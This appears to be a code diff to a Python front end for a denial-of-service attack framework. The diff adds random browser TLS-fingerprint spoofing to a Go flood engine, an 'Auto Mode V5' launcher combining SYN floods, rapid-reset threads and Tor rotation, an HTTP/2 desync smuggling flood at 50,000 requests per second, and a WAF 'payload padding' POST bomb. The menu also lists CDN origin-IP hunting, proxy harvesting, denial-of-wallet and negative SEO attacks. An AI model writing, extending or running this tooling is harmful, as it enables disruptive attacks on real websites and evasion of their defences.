@@ -8,6 +8,7 @@ import logging
 import time
 import subprocess
 import signal
+import random
 import psutil
 import threading
 from datetime import datetime
@@ -327,10 +328,11 @@ def menu():
 
   [bold magenta]AUTOMATION & UTILITIES[/]                              [bold magenta]SYSTEM & OTHERS[/]
   [bold yellow][8][/] [bold white]Mixed Attack[/]    [dim white]ALL 26 vectors parallel[/]           [bold yellow][Y][/] [bold white]Cold Start[/]      [dim white]Serverless auto-scale[/]
-  [bold yellow][9][/] [bold white]Auto Mode[/]       [dim white]AI-driven adaptive bypass[/]         [bold yellow][Z][/] [bold white]Cost Acc[/]        [dim white]Denial of Wallet[/]
+  [bold yellow][9][/] [bold white]Auto Mode V5[/]    [dim white]50+Vectors+L4+OriginV2+MSF+Report[/]   [bold yellow][Z][/] [bold white]Cost Acc[/]        [dim white]Denial of Wallet[/]
   [bold yellow][N][/] [bold white]Advanced 2026[/]   [dim white]Behavioral + Fingerprint[/]          [bold yellow][K][/] [bold white]SEO Attack[/]      [dim white]Negative SEO manipulation[/]
-  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP + Underminr CDN bypass[/]          [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
-  [bold yellow][P][/] [bold white]Harvest Proxy[/]   [dim white]Auto-scrape 24k+ proxies[/]          [bold yellow][M][/] [bold white]Bypass Config[/]   [dim white]Toggle evasion modules[/]
+  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP + Underminr CDN bypass[/]    [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
+  [bold yellow][!][/] [bold white]H2SMUGGLE[/]       [dim white]HTTP/2 desync 2026 method[/]         [bold yellow][M][/] [bold white]Bypass Config[/]   [dim white]Toggle evasion modules[/]
+  [bold yellow][P][/] [bold white]Harvest Proxy[/]   [dim white]Auto-scrape 24k+ proxies[/]          [bold yellow][#][/] [bold white]Payload Pad[/]    [dim white]WAF buffer overflow[/]
   [bold yellow][0][/] [bold white]Dashboard[/]       [dim white]Web monitoring panel[/]
 
 [dim white]──────────────────────────────────────────────────────────────────────────────────────────────────[/]"""
@@ -382,7 +384,7 @@ def get_input(prompt: str) -> str:
 
 def build_go_args(target: str, duration: int, rps: int, method: str, threads: int = 0,
                   proxy_file: str = "", http2: bool = False, rapid_reset: bool = False,
-                  origin_ip: str = "") -> List[str]:
+                  origin_ip: str = "", ja3: str = "") -> List[str]:
     args = [
         GO_ENGINE,
         "-target", target,
@@ -400,6 +402,11 @@ def build_go_args(target: str, duration: int, rps: int, method: str, threads: in
         args.append("-rapid-reset")
     if origin_ip:
         args.extend(["-origin", origin_ip])
+    if ja3:
+        args.extend(["-ja3", ja3])
+    elif method not in ("syn-flood", "udp-flood"):
+        ja3 = random.choice(["chrome136", "chrome120", "firefox140", "safari18", "edge136"])
+        args.extend(["-ja3", ja3])
     return args
 
 async def run_go_engine(target: str, duration: int, rps: int, method: str = "http-flood",
@@ -2665,22 +2672,21 @@ async def run_auto_mode(target: str, cfg: dict):
             except Exception as e:
                 _RICH_CONSOLE.print(f"[bold yellow][!][/] Smart probe skipped: {e}")
         
-        # Launch main attack via auto_mode_v2
-        from core.attack.strategies.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary
-        result = await run_auto_mode_v2(
+        # Redirect to V3 (V2 merged into V3)
+        _RICH_CONSOLE.print(f"\n[bold cyan][*][/] Using Auto Mode V3 engine (V2 merged into V3)")
+        from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
+        result = await run_auto_mode_v3(
             target=target,
+            origin_ip=origin_ip or "",
             duration=duration,
-            target_rps=target_rps,
-            config_path="config/auto_mode.json",
-            proxy_pool=proxy_pool,
-            cf_cookies=cf_cookies,
+            syn_threads=500,
+            rr_threads=200,
             tor_instances=tor_instances,
-            origin_ip=origin_ip,
+            rotation_interval=45,
         )
-        print_auto_mode_v2_summary(result)
-        return
+        return result
     except ImportError as e:
-        _RICH_CONSOLE.print(f"[bold red][-][/] Auto Mode v2 import failed: {e}")
+        _RICH_CONSOLE.print(f"[bold red][-][/] Auto Mode V3 import failed: {e}")
         _RICH_CONSOLE.print("[bold yellow][*][/] Falling back to legacy auto mode")
         await run_auto_mode_legacy(target, cfg)
     except Exception as e:
@@ -3179,8 +3185,22 @@ async def cmd_menu(cfg):
             if await _module_dispatch(run_mixed_attack, run_mixed_attack_multi, cfg):
                 get_input(" Press Enter to continue...")
         elif choice == "9":
-            if await _module_dispatch(run_auto_mode, run_auto_mode_multi, cfg):
-                get_input(" Press Enter to continue...")
+            # Auto Mode V5 - Full pipeline with 50+ vectors (replaces V3/V4)
+            target = get_input(" Target URL: ")
+            if not target: continue
+            if not target.startswith(("http://", "https://")):
+                target = "https://" + target
+            duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+            tor_input = get_input(" Tor instances (default 3): ").strip()
+            tor_cnt = max(1, int(tor_input)) if tor_input.isdigit() else 3
+            print(f"\n {c('c','[*]')} Auto Mode V5 starting...")
+            print(f" {c('c','[*]')} Phase 0: Profile + Origin V2  -> Phase 1: Bayesian + V5 Vectors + L4")
+            print(f" {c('c','[*]')} Phase 2: Multi-Vector Attack   -> Phase 3: Report")
+            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v5
+            result = await run_auto_mode_v5(
+                target=target, duration=duration, tor_instances=tor_cnt,
+            )
+            get_input(" Press Enter to continue...")
         elif choice == "N":
             if await _module_dispatch(run_advanced_2026, None, cfg):
                 get_input(" Press Enter to continue...")
@@ -3270,6 +3290,23 @@ async def cmd_menu(cfg):
             f = lambda t, c: run_dow_attack(t, c, method, label)
             if await _module_dispatch(f, None, cfg):
                 get_input(" Press Enter to continue...")
+        elif choice == "!":
+            # H2SMUGGLE - HTTP/2 Desync Attack
+            f = lambda t, c: run_go_engine(t, c.get("attack",{}).get("default_duration",120), 50000, "h2smuggle", http2=True)
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
+        elif choice == "#":
+            # Payload Padding - WAF buffer overflow via POST
+            target = get_input(" Target URL: ")
+            if not target: continue
+            if not target.startswith(("http://", "https://")):
+                target = "https://" + target
+            print(f" {c('c','[*]')} Generating padded payload...")
+            from core.attack.strategies.auto_mode_v3 import PayloadPadder
+            rps = int(get_input(" RPS (default 50000): ") or "50000")
+            dur = int(get_input(" Duration (default 120): ") or "120")
+            result = await run_go_engine(target, dur, rps, "post-bomb")
+            get_input(" Press Enter to continue...")
         else:
             print(f" {c('r','[-]')} Invalid option.")
 
